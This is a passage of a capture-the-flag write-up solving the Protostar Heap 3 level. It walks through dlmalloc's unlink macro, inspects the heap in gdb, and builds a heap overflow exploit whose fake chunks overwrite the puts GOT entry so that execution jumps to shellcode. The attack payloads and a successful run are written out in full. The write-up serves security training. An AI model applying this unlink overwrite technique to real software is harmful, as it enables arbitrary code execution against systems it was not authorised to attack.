#define unlink(P, BK, FD) {                                            \
  FD = P->fd;                                                          \
  BK = P->bk;                                                          \
  FD->bk = BK;                                                         \
  BK->fd = FD;                                                         \
}
```

Written with pointer notation:

```c
BK = *(P + 12);
FD = *(P + 8);  
*(FD + 12) = BK;
*(BK + 8) = FD; 
```

This diagram shows how the **unlink** macro works:

![before-unlink](/image/protostar-heap/before_unlink.png)
![after-unlink](/image/protostar-heap/after_unlink.png)

Once again, we see that there are ***pointer dereferences*** here in the **unlink** macro. This means we can manipulate heap data in a way that, when **free()** is called, **unlink** will execute and overwrite a **GOT entry** with our shellcode stored in the heap.

![idea-for-attack](/image/protostar-heap/idea_for_attack.png)

Also to trigger this code part, ***chunk begin consolidated must be bigger than 80 bytes***. If chunks are less than 80 bytes, it is classified as **"fast bin"**.

### Analysis

Now, we just have everything we need for this level! Let's head into analyzing the heap in **Protostar Heap 3**.

As usual, I will run `gdb` on `heap3`, set the syntax to Intel, turn off pagination, and disassemble `main()`.

```shell
user@protostar:/opt/protostar/bin$ gdb ./heap3
(gdb) set disassembly-flavor intel
(gdb) set pagination off
(gdb) disassemble main
...
0x0804892e <main+165>:  mov    DWORD PTR [esp],0x804ac27
0x08048935 <main+172>:  call   0x8048790 <puts@plt>
0x0804893a <main+177>:  leave
0x0804893b <main+178>:  ret
End of assembler dump.
```

If you look closely, you will notice that the **printf()** has been replaced with **puts()** due to some optimization when compile the program. `plt` stands for **Procedure Linkage Table (PLT)**. If we disassemble `0x8048790 <puts@plt>`, we will get the address to the **GOT entry** for **puts()**. 

```shell
(gdb) disassemble 0x8048790
Dump of assembler code for function puts@plt:
0x08048790 <puts@plt+0>:        jmp    DWORD PTR ds:0x804b128
0x08048796 <puts@plt+6>:        push   0x68
0x0804879b <puts@plt+11>:       jmp    0x80486b0
End of assembler dump.
(gdb) x 0x804b128
0x804b128 <_GLOBAL_OFFSET_TABLE_+64>:   0x08048796
```

So we want to overwrite the contents of `0x804b128` in the **GOT**, currently `0x08048796`, with the address to **winner()**. But how? 

The answer is simple, we will provide a shellcode and place that onto the heap. Then we will replace the address in the **GOT entry** with that exact memory location on the heap to run our shellcode.

To understand the program better, I will set breakpoints at the address of **malloc()**, **strcpy()**, **free()**, and **puts()**.

```shell
(gdb) break *0x8048ff2
Breakpoint 1 at 0x8048ff2: file common/malloc.c, line 3211.
(gdb) break *0x8048750
Breakpoint 2 at 0x8048750
(gdb) break *0x8049824
Breakpoint 3 at 0x8049824: file common/malloc.c, line 3583.
(gdb) break *0x8048790
Breakpoint 4 at 0x8048790
```

Run the program with some recognizable strings:

```shell
(gdb) r AAAAAAAAAAAA BBBBBBBBBBBB CCCCCCCCCCCC
Starting program: /opt/protostar/bin/heap3 AAAAAAAAAAAA BBBBBBBBBBBB CCCCCCCCCCCC

Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
3211    common/malloc.c: No such file or directory.
        in common/malloc.c
```

We've hit the first breakpoint. Continue for the first **maloc()** is called so that our heap is ready:

```shell
(gdb) c
Continuing.

Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
3211    in common/malloc.c
(gdb) info proc map
process 1671
cmdline = '/opt/protostar/bin/heap3'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/heap3'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x804b000     0x3000          0        /opt/protostar/bin/heap3
         0x804b000  0x804c000     0x1000     0x3000        /opt/protostar/bin/heap3
         0x804c000  0x804d000     0x1000          0           [heap]
...
```

So the start address of our heap is `0x804c000`. Now, I will define a hook-stop to inspect the heap better whenever a breakpoint is hit.

```shell
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/56wx 0x804c000
>x/3i $eip
>end
```

At this point two **malloc()** has been called. If we continue, we will hit the third one.

```shell
(gdb) c
Continuing.
0x804c000:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000fb1      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x8048ff2 <malloc>:     push   ebp
0x8048ff3 <malloc+1>:   mov    ebp,esp
0x8048ff5 <malloc+3>:   push   edi

Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
3211    in common/malloc.c
```

At `0x804c004`, there is a value **0x29**, which is **0b101001**. This is the size field of the first chunk. Without the last bit, it's **0b101000**, which is 40 bytes (actual size of the chunk). The last bit of the size word indicates that the previous chunk is in use. By convention the first chunk has this bit turned on because there's no previous chunk that's free.

The second chunk starts at `0x804c028` and ends at `0x804c050`. It's identical to the first chunk. 

Let's continue for the third chunk.

```shell
(gdb) c
Continuing.
0x804c000:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x8048750 <strcpy@plt>: jmp    DWORD PTR ds:0x804b118
0x8048756 <strcpy@plt+6>:       push   0x48
0x804875b <strcpy@plt+11>:      jmp    0x80486b0

Breakpoint 2, 0x08048750 in strcpy@plt ()
```

The third chunk has been created. Also at `0x804c07c`, it has value **0xf89**. This is called the ***wilderness***, indicating the remaining size of the heap. It has been decreasing when each **malloc()** is called.

Let's continue until we hit the breakpoint at **free()**.

```shell
(gdb) c
Continuing.
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x41414141      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x42424242      0x42424242      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x43434343      0x43434343
0x804c060:      0x43434343      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x8049824 <free>:       push   ebp
0x8049825 <free+1>:     mov    ebp,esp
0x8049827 <free+3>:     sub    esp,0x48

Breakpoint 3, free (mem=0x804c058) at common/malloc.c:3583
3583    in common/malloc.c
```

If we keep going, every time **free()** is called, the word right after the size of our chunk gets overwritten with the address of the next free chunk. 

If it's the first chunk being freed, there won't be a next free chunk yet, so this word will just contain the value **zero** instead.

This happens because our chunk is smaller than 80 bytes, so it gets placed into the ***fast bin***, which is a singly-linked list. Unlike regular free chunks, fast bin chunks don't have backward pointers, only a single forward pointer to the next free chunk.

```shell
(gdb) c
Continuing.
0x804c000:      0x00000000      0x00000029      0x0804c028      0x41414141
0x804c010:      0x41414141      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x0804c050      0x42424242      0x42424242      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x43434343
0x804c060:      0x43434343      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x8048790 <puts@plt>:   jmp    DWORD PTR ds:0x804b128
0x8048796 <puts@plt+6>: push   0x68
0x804879b <puts@plt+11>:        jmp    0x80486b0

Breakpoint 4, 0x08048790 in puts@plt ()
```

Now it's time to think about our solution!

Looking at the source code, we can see that the program first frees the third chunk. To make our exploit easier, we'll modify the heap in a way that triggers **forward consolidation**.

We want to avoid **backward consolidation** because it makes things more complicated, and that's not what we want. So, **forward consolidation** is our best choice right now!

### Creating Exploit

We first find the address of **winner()** using `objdump`.

```shell
user@protostar:/opt/protostar/bin$ objdump -t ./heap3 | grep winner
08048864 g     F .text  00000025              winner
```

Now then we want to place the address of **winner()** into the **GOT entry**. A wise way to do this is to create a payload and place that onto the heap.

```asm
mov eax, 0x08048864
call eax
```

Using <a href="https://defuse.ca/online-x86-assembler.htm" target="_blank">online x86 disassembler</a> will help us disassemble our assembly code.

Here is the payload:

```shell
\xB8\x64\x88\x04\x08\xFF\xD0
```

But where should we place this payload in the heap?

The idea here is to put the payload on the first chunk. But things should be under careful consideration since the first word in the **user data** is written with the address of the next free chunk. How about crafting 4 words' padding? That's sound fantastic! We will add a padding with 12 A, then is our shellcode.

Here is the first argument:

```shell
user@protostar:~$ python -c 'print "A" * 12 + "\xB8\x64\x88\x04\x08\xFF\xD0"' > /tmp/A
```

We can use the second argument to overwrite the size of the third chunk to be greater than 80 bytes to trigger the **unlink()** macro when the third chunk is **free()**. 

The second chunk's data starts at `0x804c030`, ends 32 bytes later at `0x804c050`, and the third chunk's size is four bytes later at `0x804c054`
So our padding must be:

$$
32 + 4 = 36
$$

For the size of the third chunk, we can use 100 bytes (0x64 in hex). Since we want to prevent **backward consolidation**, remember to set the last bit to 1 to show that the second (previous) chunk is in use. So the size of the third chunk must be **0x65**.

```shell
user@protostar:~$ python -c 'print "B" * 36 + "\x65"' > /tmp/B
```

Now the real magic begins!

We will use the third argument to create ***two more fake chunks***. The reason for this comes from how `free()` consolidates memory forward.

Take a look at this code:

```c
 if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
        unlink(nextchunk, bck, fwd);
        size += nextsize;
      } else
	      clear_inuse_bit_at_offset(nextchunk, 0);
...
}
```

Here's what’s happening:

- The **third chunk** (current chunk) is the one being freed first
- The program checks `nextinuse` to see if it can trigger **unlink()**
- `nextinuse` is calculated using `inuse_bit_at_offset`, which checks the `PREV_INUSE` bit of the next chunk's next chunk (so it actually checks the fifth chunk from the fourth chunk)

This is how `inuse_bit_at_offset` works:

```c
/* check/set/clear inuse bits in known places */
#define inuse_bit_at_offset(p, s)\
 (((mchunkptr)(((char*)(p)) + (s)))->size & PREV_INUSE)
```

Since we know that the third chunk is **0x64** bytes in size, we can calculate where the fourth chunk (our first fake chunk) starts:

$$
0x804c050 + 0x64 = 0x804c0b4
$$

So, the fourth chunk begins at `0x804c0b4`. Since we're marking ***the fourth chunk as free***, we need to set up its `fd` and `bk` fields carefully:

- We want **(FD + 12) = 0x804b128**, so **FD** should be `0x804b128 - 12 = 0x804b11c` (this is **12 bytes before a GOT entry**).
- We set **BK** to `0x0804c014`, which points to our payload on the heap.

Now, back to our main goal: crafting the third argument. Our objective is to trigger **forward consolidation**, which means we need to **control the size of the fifth chunk**.

To achieve this, the `PREV_INUSE` bit in the fifth chunk must be **zero**, meaning we need to overwrite the size of the fourth chunk to ensure proper heap manipulation.

At first, you might think using a small size like `0x10` in the fourth chunk's size field would work. But there's a problem, where writing `\x00\x00\x00\x10` to memory will cause **strcpy()** to stop copying at `\x00`.

A better approach is to use a large value, such as `0xfffffffc`. This works because the `inuse_bit_at_offset()` function simply adds two numbers without performing any validation checks.

Additionally, we need the `PREV_INUSE` bit of the fifth chunk to be turned off, and using `0xfffffffc` achieves this as well.

But where should we place this fifth chunk on the heap?

Interestingly, `0xfffffffc` is **-4** in two’s complement (for signed integers). This means the first byte of the fourth chunk will actually be interpreted as the size of the fifth chunk.

Since the fourth chunk starts at `0x0804c0b4`, let's compute the location of the fifth chunk:

$$
    0x0804c0b4 + 0xfffffffc
$$

$$
  = 0x0804c0b4 - 4 
$$

$$
  = 0x0804c0b0
$$

Thus, the fifth chunk begins at `0x0804c0b0`. At `0x0804c0b4`, we overwrite it with `0xfffffffc`, effectively marking the fourth chunk as free. This ensures that forward consolidation works correctly.

Here is the third argument:

```shell
user@protostar:~$ python -c 'print "C" * 92 + "\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08"' > /tmp/C
```

### Testing The Exploit

```shell
user@protostar:~$ python -c 'print "A" * 12 + "\xB8\x64\x88\x04\x08\xFF\xD0"' > /tmp/A
user@protostar:~$ python -c 'print "B" * 36 + "\x65"' > /tmp/B
user@protostar:~$ python -c 'print "C" * 92 + "\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08"' > /tmp/C
user@protostar:~$ /opt/protostar/bin/heap3 $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
that wasn't too bad now, was it? @ 1742401696
Segmentation fault
```

Nice :>

### References

- <a href="https://phrack.org/issues/57/9#article" target="_blank">"Once upon a free()"</a>
- <a href="https://gist.github.com/dathwang/89a6b012828ed26f6cb2a7961908d333" target="_blank">dlmalloc - version from 2001</a>